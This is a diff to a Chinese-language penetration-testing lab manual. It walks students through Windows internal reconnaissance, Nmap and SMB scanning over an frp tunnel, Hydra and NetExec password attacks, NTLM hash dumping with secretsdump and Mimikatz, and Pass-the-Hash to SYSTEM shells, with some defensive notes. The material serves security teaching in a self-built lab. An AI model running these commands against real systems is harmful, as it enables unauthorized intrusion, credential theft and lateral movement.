@@ -751,74 +751,94 @@ proxychains curl http://127.0.0.1:10002
 ### 实验7：Windows 内网信息收集（在 SRV02 上执行）
 
 > **操作方式**：本实验同时提供图形界面和命令行两种方式。
+>
+> **实验背景**：假设你已经通过 frp 隧道获得了 SRV02 的远程桌面（RDP），现在需要了解这台机器和它所在的内网环境。
 
-**第一步：本机网络信息收集**
+**第一步：本机网络信息——"我在哪？"**
 
 ```powershell
 # 查看完整网络配置
 ipconfig /all
-# 关键信息：IPv4 地址、默认网关、DNS 服务器
+# 关键看：IPv4 地址（确定网段）、默认网关（内网路由）、DNS 服务器（可能指向域控）
 
-# 查看路由表
+# 查看路由表（发现可达的其他网段）
 route print
-# 关键信息：本地网段范围，是否存在多网段
+# 关键看：是否有多个网段路由 → 攻击者可能跳到其他子网
 
-# 查看 ARP 缓存（发现同网段主机）
+# 查看 ARP 缓存（发现同网段主机，被动方式不触发告警）
 arp -a
-# 关键信息：已通信主机的 IP 和 MAC 地址
+# 关键看：Interface 下的 IP 列表 = 最近通信过的同网段主机
+# 示例输出：
+#   192.168.1.1        00-50-56-xx-xx-xx    动态    ← 网关
+#   192.168.1.10       00-0c-29-xx-xx-xx    动态    ← 同网段另一台主机！
 
-# 查看活跃网络连接
+# 查看活跃网络连接（正在通信的主机和端口）
 netstat -an | findstr "ESTABLISHED"
-# 关键信息：正在通信的主机和端口
-
-# 查看 DNS 缓存
-ipconfig /displaydns | findstr "Record"
-# 关键信息：最近访问过的域名
+# 关键看：内网 IP 的连接 → 发现活跃的内网通信对象
 ```
+
+> 💡 **攻击者视角**：`ipconfig` 告诉我网段是 192.168.1.0/24，`arp -a` 告诉我这个网段里有其他主机。下一步就是扫描这些主机。
 
 **图形界面方式**：`Win+R` → `ncpa.cpl` → 右键网卡 → 状态 → 详细信息。
 
-**第二步：用户、组和系统信息收集**
+**第二步：用户、组和系统信息——"我是谁？我能做什么？"**
 
 ```powershell
-# 当前用户信息（权限、组成员、SID）
+# 当前用户信息（权限、组成员、特权）
 whoami /all
+# 关键看：
+#   GROUP INFORMATION → 是否在 Administrators 组？
+#   PRIVILEGES INFO   → 是否有 SeDebugPrivilege、SeImpersonatePrivilege？
 
 # 本地用户列表
 net user
+# 关键看：有哪些用户 → 猜测弱口令的起点
 
 # 本地管理员组成员
 net localgroup administrators
+# 关键看：除当前用户外还有谁是管理员 → 其他可攻击的高权限账户
 
 # 系统信息（OS版本、补丁列表）
 systeminfo
-
-# 已安装补丁（攻击者用此判断未修复的漏洞）
-wmic qfe list full
-
-# 计算机名和域名
-hostname
-echo %USERDOMAIN%
+# 关键看：
+#   OS Name / OS Version → 确定系统版本
+#   Hotfix(s)            → 已安装补丁列表 → 反向推断未修补的漏洞
 ```
 
-**第三步：网络邻居和共享资源收集**
+> 💡 **攻击者视角**：`whoami /all` 显示当前用户是管理员且有 `SeDebugPrivilege`——可以直接 dump 其他进程的凭据。`systeminfo` 的补丁列表可以对照漏洞数据库（如 Windows Exploit Suggester）找出可利用的漏洞。
+
+**第三步：进程、服务和安全软件——"有什么在保护这台机器？"**
 
 ```powershell
-# 查看网络上的计算机（NetBIOS广播）
+# 查看运行的进程（重点发现安全软件）
+Get-Process | Select-Object Name, Id, Path | Format-Table -AutoSize
+# 关键看：
+#   MsMpEng.exe      → Windows Defender 正在运行
+#   csrss.exe        → 正常系统进程
+#   如果看到 360、火绒等 → 需要额外的绕过技术
+
+# 查看运行的服务
+Get-Service | Where-Object {$_.Status -eq "Running"} | Select-Object Name, DisplayName
+# 关键看：是否有未加固的服务可被利用
+```
+
+> 💡 **攻击者视角**：如果发现 Windows Defender 运行中，Mimikatz 可能被拦截——需要先关闭实时防护或使用内存加载方式。
+
+**第四步：网络邻居和共享资源——"周围有什么？"**
+
+```powershell
+# 查看网络上的 Windows 主机（NetBIOS 广播）
 net view
+# 预期：列出同网段/同域中可见的 Windows 主机名
 
 # 查看本机共享资源
 net share
 # 预期：C$、ADMIN$、IPC$ 等默认共享
+# 攻击者关注：IPC$（可用于空连接枚举）、C$/ADMIN$（可远程读写文件）
 
 # 查看远程主机的共享
 net view \\<其他主机IP>
-
-# 查看运行的服务
-Get-Service | Where-Object {$_.Status -eq "Running"} | Select-Object Name, DisplayName, StartType
-
-# 查看进程列表（发现安全软件如 MsMpEng.exe = Windows Defender）
-Get-Process | Select-Object Name, Id, Path | Format-Table -AutoSize
+# 目的：确认远程主机有哪些可访问的共享文件夹
 ```
 
 ---
@@ -826,41 +846,57 @@ Get-Process | Select-Object Name, Id, Path | Format-Table -AutoSize
 ### 实验8：Nmap 内网扫描（通过 frp 隧道从 Kali 执行）
 
 > ⚠️ **前置条件**：完成实验1-4，SOCKS5 代理可用。
+>
+> **实验背景**：实验7 中 `arp -a` 和 `ipconfig` 已经告诉我们 SRV02 的网段和 IP。现在从攻击机（Kali）通过 frp 隧道远程扫描 SRV02，验证发现的信息并探测更多细节。
 
-**第一步：通过 SOCKS5 代理扫描 SRV02**
+**第一步：直接扫描 frp 映射端口（快速摸底）**
+
+```bash
+# 不经过 SOCKS5，直接扫描 ECS 上的映射端口（速度快）
+nmap -sV -p 10001,10002,10003,10004 <ECS公网IP>
+
+# 预期输出：
+# PORT     STATE  SERVICE       VERSION
+# 10001/tcp open  ms-wbt-server Microsoft Terminal Services  ← RDP
+# 10002/tcp open  http          Microsoft IIS httpd 10.0     ← Web
+# 10003/tcp open  wsman                                  ← WinRM
+# 10004/tcp open  microsoft-ds  Windows SMB              ← SMB
+```
+
+> 💡 **这一步的意义**：通过 frp 映射端口直接扫，速度快、不需要 proxychains。可以快速确认哪些服务在运行、运行什么版本——为后续选择攻击工具提供依据。
+
+**第二步：通过 SOCKS5 代理扫描（完整端口扫描）**
 
 ```bash
 # 确认 proxychains 配置：socks5 <ECS公网IP> 10080
 
-# 扫描 SRV02 端口（127.0.0.1 因为 SOCKS5 从 SRV02 本地发起连接）
+# 扫描 SRV02 的常用端口（SOCKS5 从 SRV02 本地发起，所以目标是 127.0.0.1）
 proxychains nmap -sT -p 21,22,80,135,139,445,3389,5985 127.0.0.1
 
 # 预期输出：
 # PORT     STATE  SERVICE
 # 80/tcp   open   http
 # 135/tcp  open   msrpc
+# 139/tcp  open   netbios-ssn
 # 445/tcp  open   microsoft-ds
 # 3389/tcp open   ms-wbt-server
 # 5985/tcp open   wsman
 ```
 
-**第二步：直接扫描 frp 映射端口（更快）**
+> 💡 **SOCKS5 扫描 vs 直接扫映射端口**：
+> - **直接扫映射端口**：速度快，但只能扫已配置映射的端口
+> - **SOCKS5 + proxychains**：速度慢，但可以扫 SRV02 上的**所有端口**，包括未映射的
+> - 实际操作中，先快速扫映射端口摸底，再用 SOCKS5 补充扫描
+
+**第三步：SMB 漏洞检测与共享枚举**
 
 ```bash
-# 不经过 SOCKS5，直接扫描 ECS 上的映射端口
-nmap -sV -p 10001,10002,10003,10004 <ECS公网IP>
-
-# 预期：能看到各映射端口对应的服务版本
-```
-
-**第三步：SMB 扫描**
-
-```bash
-# 通过代理扫描 SMB 漏洞
+# 通过代理检测 SMB 已知漏洞（如 EternalBlue MS17-010）
 proxychains nmap -sT --script smb-vuln* -p 445 127.0.0.1
 
 # 通过代理枚举 SMB 共享和用户
 proxychains nmap -sT --script smb-enum-shares,smb-enum-users -p 445 127.0.0.1
+# 目的：发现可访问的共享和用户列表 → 为暴力破解和横向移动提供目标
 ```
 
 ---
@@ -869,12 +905,12 @@ proxychains nmap -sT --script smb-enum-shares,smb-enum-users -p 445 127.0.0.1
 
 | 知识点 | 要点 |
 | --- | --- |
-| 信息收集层次 | 本机信息→网络邻居→主动扫描，由近及远逐步扩展 |
-| 本机网络信息 | `ipconfig /all`、`arp -a`、`route print`、`netstat -an` |
-| 用户组信息 | `whoami /all`、`net user`、`net localgroup administrators` |
-| 共享资源枚举 | `net share`（本机）、`net view \\主机`（远程主机） |
-| 两种扫描方式 | proxychains + SOCKS5（全能但慢）vs 直接扫 frp 映射端口（快但只扫已知端口） |
-| 攻击者视角 | 信息收集的目的是发现可攻击的面和横向移动的路径 |
+| 三个核心问题 | "我在哪"（网络位置）、"周围有什么"（目标发现）、"我能做什么"（权限评估） |
+| 三层收集体系 | 本机信息 → 网络邻居 → 主动扫描，由近及远、由被动到主动 |
+| 被动收集（不触发告警） | `ipconfig`、`route print`、`arp -a`、`netstat -an` |
+| 主动扫描（可能触发告警） | `nmap -sT`、`smb-vuln*`、`smb-enum-*` |
+| 两种扫描方式 | 直接扫映射端口（快但有限）vs SOCKS5 + proxychains（慢但完整） |
+| 攻击者视角 | 每条信息都在回答"下一步能攻击什么"——信息收集是攻击链的基础 |
 
 ---
 
@@ -882,40 +918,47 @@ proxychains nmap -sT --script smb-enum-shares,smb-enum-users -p 445 127.0.0.1
 
 ## 🧠 理论知识
 
-### 网络攻击一般流程
+### 攻击链：从信息收集到横向移动
 
-**经典攻击流程**（Cyber Kill Chain）：
-
-| 阶段 | 说明 | 对应MITRE ATT&CK |
-| --- | --- | --- |
-| **踩点** | 收集目标信息（IP、域名、员工信息） | TA0043 侦察 |
-| **扫描** | 扫描开放端口、服务版本、漏洞 | TA0007 发现 |
-| **查点** | 枚举用户、共享、服务详情 | TA0007 发现 |
-| **入侵** | 利用漏洞或弱口令获取初始访问 | TA0001 初始访问 |
-| **提权** | 从普通用户提升为管理员/SYSTEM | TA0004 权限提升 |
-| **持久化** | 安装后门保持访问 | TA0003 持久化 |
-| **掩盖踪迹** | 清理日志、删除工具痕迹 | TA0005 防御规避 |
-
-### Pass-the-Hash（哈希传递攻击）
-
-**Pass-the-Hash（PtH）** 是内网横向移动最常用的技术。攻击者无需明文密码，仅凭 NTLM 哈希即可完成身份认证。
+前面的任务已经完成了攻击链的前三步：
 
 ```
-正常认证：用户输入密码 → 计算NTLM Hash → 与存储的Hash比对 → 通过
-PtH攻击：攻击者直接用Hash构造认证请求 → 与存储的Hash比对 → 通过
+✅ 已完成                           ⬇️ 本任务要做的
 
-根本原因：NTLM协议只验证"是否拥有正确的Hash"，不验证"是否知道密码"
-         → Hash在认证中与密码等价
+frp 隧道建立（任务一/二）            弱口令暴力破解 → 获取凭据
+内网信息收集（任务三）               Pass-the-Hash → 横向移动到其他主机
+    ↓                               获取更多凭据 → 扩大战果
+知道了目标 IP、端口、服务版本
 ```
 
-### 横向移动常用工具
+### Pass-the-Hash（哈希传递攻击）——为什么凭据比密码更重要？
 
-| 工具 | 协议 | 特点 |
-| --- | --- | --- |
-| **impacket-psexec** | SMB(445) | 上传服务并执行，返回 SYSTEM Shell |
-| **impacket-wmiexec** | WMI(135) | 远程执行命令，无文件落地 |
-| **evil-winrm** | WinRM(5985) | 交互式 Shell，支持文件上传 |
-| **NetExec（nxc）** | SMB/LDAP/WinRM | 批量验证、枚举和远程执行 |
+Windows 系统不存储明文密码，而是存储密码的 **NTLM 哈希**（可以理解为密码的"指纹"）。问题在于：
+
+```
+正常登录：
+  用户输入密码 → Windows 计算密码的哈希 → 与存储的哈希比对 → 匹配则通过
+
+Pass-the-Hash 攻击：
+  攻击者跳过"输入密码"这一步，直接把窃取到的哈希发给目标机器
+  Windows 比对哈希 → 匹配 → 通过！
+
+后果：只要拿到哈希，不需要知道密码就能登录
+     → 哈希 ≈ 密码（在认证层面等价）
+```
+
+> 💡 **这就是为什么"改密码"不够**——如果哈希已经被窃取，攻击者可以在密码更改之前就使用它。真正的防御是阻止哈希被窃取（Credential Guard）或禁止 NTLM 认证（Protected Users）。
+
+### 横向移动工具对比
+
+| 工具 | 协议/端口 | 特点 | 适用场景 |
+| --- | --- | --- | --- |
+| **NetExec (nxc)** | SMB(445) / WinRM / LDAP | 批量验证凭据、远程执行命令 | 快速验证哈希是否有效 |
+| **impacket-wmiexec** | WMI(135) | 无文件落地，隐蔽性好 | 需要隐蔽的远程执行 |
+| **impacket-psexec** | SMB(445) | 上传服务并执行，返回 SYSTEM Shell | 需要最高权限的 Shell |
+| **evil-winrm** | WinRM(5985) | 交互式 Shell，支持文件上传/下载 | 需要交互式操作和文件传输 |
+
+> 💡 **工具选择逻辑**：先用 `nxc` 验证凭据是否有效（一行命令就能试），再用 `wmiexec`/`psexec`/`evil-winrm` 获取交互式 Shell 进行深入操作。
 
 ---
 
@@ -923,7 +966,7 @@ PtH攻击：攻击者直接用Hash构造认证请求 → 与存储的Hash比对 
 
 ### 实验9：弱口令攻击
 
-> ⚠️ **前置条件**：frp 隧道已建立，RDP 映射端口 10001 可用。
+> ⚠️ **前置条件**：frp 隧道已建立，RDP 映射端口 10001 和 SMB 映射端口 10004 可用。
 
 **前置准备——在 SRV02 上创建弱口令账户**：
 
@@ -956,7 +999,7 @@ admin123
 qwerty
 EOF
 
-# 通过 frp 隧道暴力破解
+# 通过 frp 隧道暴力破解 RDP
 hydra -L /tmp/users.txt -P /tmp/passwords.txt rdp://<ECS公网IP> -s 10001 -t 4
 
 # 预期输出：
@@ -964,19 +1007,33 @@ hydra -L /tmp/users.txt -P /tmp/passwords.txt rdp://<ECS公网IP> -s 10001 -t 4
 # [3389][rdp] host: <ECS公网IP>   login: testuser   password: P@ssw0rd
 ```
 
-**第二步：使用 Medusa 进行 SMB 密码喷洒**
+> 💡 **攻击者视角**：找到了两个有效凭据——`admin123:123456` 和 `testuser:P@ssw0rd`。其中 `admin123` 是管理员，可以直接用于横向移动。
+
+**第二步：使用 NetExec 进行 SMB 密码喷洒**
 
 ```bash
-medusa -h <ECS公网IP> -u administrator -P /tmp/passwords.txt -M smbnt -n 10004
+# NetExec 比 Medusa 更适合 SMB 协议，输出信息更丰富
+# 验证 administrator 账户的密码列表
+nxc smb <ECS公网IP> --port 10004 -u administrator -p /tmp/passwords.txt
+
+# 预期输出（成功时显示 Pwn3d!）：
+# SMB  <ECS公网IP>:10004  SRV02  [+] administrator:P@ssw0rd (Pwn3d!)
+
+# 批量验证多个用户
+nxc smb <ECS公网IP> --port 10004 -u /tmp/users.txt -p /tmp/passwords.txt
 ```
+
+> 💡 **为什么用 nxc 而不是 Medusa？** NetExec 专为 Windows 协议设计，不仅能验证密码，还能直接远程执行命令（`-x "whoami"`）、导出哈希（`--sam`），是内网渗透的瑞士军刀。
 
 ---
 
 ### 实验10：Pass-the-Hash 横向移动
 
-> ⚠️ **前置条件**：已获取 SRV02 的管理员凭据。
+> ⚠️ **前置条件**：已通过实验9获取 SRV02 的管理员凭据（`administrator:P@ssw0rd`）。
+>
+> **攻击链位置**：弱口令破解 → 明文密码 → **获取哈希** → **PtH 横向移动**（本实验）
 
-**Impacket 安装**：
+**工具安装**（在 Kali 上执行）：
 
 ```bash
 sudo apt update
@@ -986,44 +1043,52 @@ which impacket-secretsdump impacket-wmiexec impacket-psexec nxc
 
 **第一步：获取 NTLM 哈希**
 
+拿到明文密码后，下一步是获取 NTLM 哈希。有两种方法：
+
 ```bash
-# 方法一：通过 Evil-WinRM（通过 frp WinRM 隧道）
+# 方法一：通过 secretsdump 远程导出（推荐，最简单）
+# 通过 SOCKS5 代理连接 SRV02，导出所有本地用户的哈希
+proxychains impacket-secretsdump administrator:'P@ssw0rd'@127.0.0.1
+
+# 预期输出（关键部分）：
+# Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH值>:::
+#                  ↑ LM Hash（通常为空）                ↑ NTLM Hash（这就是我们需要的）
+
+# 方法二：通过 Evil-WinRM + Mimikatz（交互式，更直观）
 evil-winrm -i <ECS公网IP> -P 10003 -u administrator -p 'P@ssw0rd'
 
-# 在 Evil-WinRM 会话中获取哈希
+# 在 Evil-WinRM 会话中执行 Mimikatz
 Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
-# 或上传并执行 mimikatz
+# 或上传 mimikatz 本地执行
 upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
 .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
-
-# 记录输出中的 NTLM 哈希：
-# Username : administrator
-# NTLM     : <NTLM_HASH值>
 ```
 
-```bash
-# 方法二：通过 SOCKS5 代理使用 secretsdump
-# proxychains 配置：socks5 <ECS公网IP> 10080
-proxychains impacket-secretsdump administrator:'P@ssw0rd'@127.0.0.1
-```
+> 💡 **记录 NTLM 哈希**：将输出中的 NTLM 哈希值保存好，后续步骤会用到。格式类似：`e0f2b4b11bcf22d4c7d0c4c4e8a4b3f1`
 
-**第二步：使用获取的哈希进行 PtH 攻击**
+**第二步：使用哈希进行 PtH 攻击**
+
+有了 NTLM 哈希，即使不知道密码也能登录目标机器：
 
 ```bash
-# 方法一：NetExec 验证哈希（通过 frp SMB 映射）
+# 方法一：NetExec 快速验证哈希（最快，一行命令）
 nxc smb <ECS公网IP> --port 10004 -u administrator -H '<NTLM_HASH>'
+# 预期：显示 [+] administrator:<HASH> (Pwn3d!) → 哈希有效
 
-# 方法二：NetExec 远程执行命令
+# 方法二：NetExec 远程执行命令（验证 + 执行一步到位）
 nxc smb <ECS公网IP> --port 10004 -u administrator -H '<NTLM_HASH>' -x "whoami"
+# 预期：显示命令执行结果 NT AUTHORITY\SYSTEM
 
-# 方法三：Impacket wmiexec（交互式 Shell，走 SOCKS5）
+# 方法三：Impacket wmiexec（交互式 Shell，走 SOCKS5，无文件落地）
 proxychains impacket-wmiexec -hashes :'<NTLM_HASH>' administrator@127.0.0.1
+# 预期：获得 SRV02 的命令行 Shell
 
-# 方法四：Impacket psexec（SYSTEM Shell，走 SOCKS5）
+# 方法四：Impacket psexec（SYSTEM 权限 Shell，走 SOCKS5）
 proxychains impacket-psexec -hashes :'<NTLM_HASH>' administrator@127.0.0.1
+# 预期：获得 NT AUTHORITY\SYSTEM 的最高权限 Shell
 ```
 
-> 💡 **PtH 的教学意义**：密码哈希在 Windows 认证中等价于明文密码。防御措施：Protected Users 组（禁止 NTLM）、Credential Guard（虚拟化保护凭据）、SMB 签名（防止哈希中继）。
+> 💡 **PtH 的关键理解**：整个过程中我们**从未输入过密码**——只用了哈希。这就是为什么 NTLM 哈希在安全领域被视为"等价于密码"的敏感凭据。防御措施见任务五。
 
 ---
 
@@ -1044,12 +1109,13 @@ proxychains impacket-psexec -hashes :'<NTLM_HASH>' administrator@127.0.0.1
 
 | 知识点 | 要点 |
 | --- | --- |
-| 攻击流程 | 踩点→扫描→查点→入侵→提权→持久化→掩盖踪迹 |
-| 弱口令攻击 | Hydra/Medusa 通过 frp 隧道暴力破解 |
-| Pass-the-Hash | 无需明文密码，仅凭 NTLM 哈希即可认证和横向移动 |
-| Impacket 工具族 | psexec（SMB执行）、wmiexec（WMI执行）、secretsdump（哈希导出） |
-| frp在渗透中的角色 | 将内网服务映射到公网，使 Impacket/Hydra 等工具可直接攻击 |
-| 域级攻击（扩展） | Kerberoasting、DCSync、黄金票据详见《实验六》 |
+| 攻击链位置 | 信息收集（任务三）→ 弱口令破解 → 获取凭据 → PtH 横向移动 |
+| 弱口令攻击 | Hydra 暴力破解 RDP；NetExec 批量验证 SMB 凭据 |
+| NTLM 哈希 | Windows 存储密码的"指纹"，在认证中等价于明文密码 |
+| Pass-the-Hash | 无需明文密码，直接用哈希完成认证 → 为什么"哈希泄露 = 密码泄露" |
+| 获取哈希 | `impacket-secretsdump`（远程导出）或 Mimikatz（本地提取） |
+| 横向移动工具 | nxc（快速验证）、wmiexec（隐蔽执行）、psexec（SYSTEM Shell）、evil-winrm（交互式） |
+| frp 的角色 | 将内网服务映射到公网，使 Kali 上的工具可以直接攻击内网主机 |
 
 ---
 
@@ -1236,14 +1302,17 @@ nxc smb <ECS公网IP> --port 10004 -u administrator -H '<NTLM_HASH>'
 | --- | --- |
 | 阿里云安全组 | ECS 控制台 → 安全组 → 添加入站规则 |
 | ECS SSH 连接 | `ssh root@<ECS公网IP>` |
-| frps 启动 | `/opt/frp/frps -c /opt/frp/frps.toml` |
-| frpc 启动 | `C:\frp\frpc.exe -c C:\frp\frpc.toml` |
+| frps 前台启动 | `/opt/frp/frps -c /opt/frp/frps.toml` |
+| frps 注册服务 | `systemctl enable frps && systemctl start frps` |
+| frpc 前台启动 | `C:\frp\frpc.exe -c C:\frp\frpc.toml` |
+| frpc 注册服务 | NSSM：`nssm install frpc "C:\frp\frpc.exe" "-c" "C:\frp\frpc.toml"` |
 | frp Dashboard | `http://<ECS公网IP>:7500` |
 | SSH 远程转发 | `ssh -R 远程端口:127.0.0.1:本地端口 root@<ECS公网IP> -N -f` |
 | proxychains | `proxychains nmap -sT -p 端口 127.0.0.1` |
 | RDP 暴力破解 | `hydra -L users.txt -P pwds.txt rdp://<ECS公网IP> -s 10001` |
-| 获取哈希 | `evil-winrm -i <ECS公网IP> -P 10003` + Mimikatz |
-| PtH 攻击 | `proxychains impacket-wmiexec -hashes :HASH admin@127.0.0.1` |
+| SMB 密码喷洒 | `nxc smb <ECS公网IP> --port 10004 -u 用户 -p 密码.txt` |
+| 获取哈希 | `proxychains impacket-secretsdump administrator:'密码'@127.0.0.1` |
+| PtH 攻击 | `nxc smb <IP> --port 10004 -u admin -H '<HASH>'` 或 `proxychains impacket-wmiexec -hashes :HASH admin@127.0.0.1` |
 | SMB 签名 | `Set-ItemProperty "LanmanServer\Parameters" "RequireSecuritySignature" 1` |
 | Protected Users | `Add-ADGroupMember -Identity "Protected Users" -Members "Administrator"` |
 | krbtgt 重置 | `Set-ADAccountPassword -Identity krbtgt -NewPassword $pwd -Reset`（两次） |
